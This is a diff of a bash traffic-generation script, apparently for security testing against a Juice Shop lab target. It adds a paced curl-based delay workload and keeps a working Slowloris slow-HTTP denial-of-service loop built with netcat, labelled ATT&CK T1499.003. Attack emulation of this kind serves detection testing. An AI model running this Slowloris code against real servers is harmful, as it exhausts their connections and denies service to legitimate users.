@@ -22,27 +22,35 @@ echo ""
 
 echo "=== T1499.003: Endpoint DoS — Application Exhaustion ==="
 echo "    Technique: Slowloris-style slow HTTP attack (15s)"
-SLOWLORIS_CONNS="${TGEN_SLOW_CONNECTIONS:-20}"
-PIDS=()
-for i in $(seq $SLOWLORIS_CONNS); do
-  (
-    {
-      echo "GET /juice-shop/ HTTP/1.1"
-      echo "Host: ${TARGET}"
-      echo "User-Agent: Mozilla/5.0 (Slowloris)"
-      for j in $(seq 1 3); do
-        sleep 5
-        echo "X-Slow-${j}: keep-alive-$(date +%s)"
-      done
-    } | nc -q0 "$TARGET" 80 2>/dev/null || true
-  ) &
-  PIDS+=($!)
-done
-echo "  Opened ${SLOWLORIS_CONNS} slow connections..."
-sleep 15
-for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done
-wait 2>/dev/null
-echo "  Slowloris attack completed"
+if [[ -n "${TGEN_INHERITED_BOUNDARY:-}" ]]; then
+  echo "[CATALOG] Paced HTTP delay workload; bounded slow-header sockets run in the connection catalog"
+  for i in $(seq 1 "${TGEN_CONCURRENCY:-20}"); do
+    curl -sk --max-time 15 -o /dev/null "${BASE}/httpbin/delay/2" &
+  done
+  wait
+else
+  SLOWLORIS_CONNS="${TGEN_SLOW_CONNECTIONS:-20}"
+  PIDS=()
+  for i in $(seq $SLOWLORIS_CONNS); do
+    (
+      {
+        echo "GET /juice-shop/ HTTP/1.1"
+        echo "Host: ${TARGET}"
+        echo "User-Agent: Mozilla/5.0 (Slowloris)"
+        for j in $(seq 1 3); do
+          sleep 5
+          echo "X-Slow-${j}: keep-alive-$(date +%s)"
+        done
+      } | nc -q0 "$TARGET" 80 2>/dev/null || true
+    ) &
+    PIDS+=($!)
+  done
+  echo "  Opened ${SLOWLORIS_CONNS} slow connections..."
+  sleep 15
+  for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null; done
+  wait 2>/dev/null
+  echo "  Slowloris attack completed"
+fi
 echo ""
 
 echo "=== T1565.001: Data Manipulation — Stored Data ==="
